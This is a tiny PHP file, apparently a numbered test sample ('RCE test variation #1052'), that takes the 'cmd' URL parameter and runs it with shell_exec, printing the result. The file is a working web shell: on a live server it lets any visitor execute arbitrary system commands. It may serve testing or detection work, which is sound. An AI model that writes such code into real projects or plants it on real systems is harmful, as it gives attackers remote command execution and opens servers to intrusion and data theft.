<?php
// RCE test variation #1052
$cmd = $_GET['cmd'] ?? 'ls';
echo shell_exec($cmd);
?>